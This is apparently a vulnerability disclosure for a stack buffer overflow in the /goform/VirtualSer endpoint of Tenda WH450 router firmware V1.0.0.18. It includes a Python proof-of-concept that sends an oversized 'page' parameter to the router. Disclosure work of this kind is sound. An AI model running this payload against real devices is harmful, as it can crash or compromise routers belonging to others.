# Bug Report: Buffer Overflow in Tenda WH450 V1.0.0.18 Router
A buffer overflow vulnerability has been discovered in the Tenda WH450 Router firmware version V1.0.0.18. The vulnerability exists in the `/goform/VirtualSer` HTTP request handler and can be exploited remotely by unauthenticated attackers to achieve arbitrary code execution or cause denial of service conditions.

## Vulnerability Details

### Product Information
- **Product**: Tenda WH450
- **Affected Version**: V1.0.0.18
- **Vulnerability Type**: Stack-based Buffer Overflow

## Description:
A buffer overflow vulnerability exists in the HTTP request handler for the `/goform/VirtualSer` endpoint. The vulnerability is triggered when processing requests containing the following parameters with excessive data lengths: `page`.
![alt text](image.png)
## poc
![alt text](image-1.png)

## Reproduce
```python
#!/usr/bin/env python3
from pwn import *
import requests

BASE_URL = "http://10.10.10.1"

def login(sess):
    login_url = BASE_URL + "/login/Auth"
    data = {
        "username": "",
        "password": "",
    }

    print("[*] logging in...")
    r = sess.post(login_url, data=data, allow_redirects=True)
    print(f"[*] final url: {r.url}")
    print(f"[*] status: {r.status_code}")

    print(f"[*] cookies after login: {sess.cookies.get_dict()}")


def send_payload(sess, payload):
    url = BASE_URL + "/goform/VirtualSer"
    print("[*] sending payload...")
    r = sess.get(url, params={"page": payload})
    print(f"Response status code: {r.status_code}")
    print(f"Response body:\n{r.text[:500]}") 

if __name__ == "__main__":
    sess = requests.Session()

    login(sess)

    overflow_string = "A" * 240
    
    payload = {
        "entrys": "dummy_value",
        "page": overflow_string
    }

    send_payload(sess, payload)

```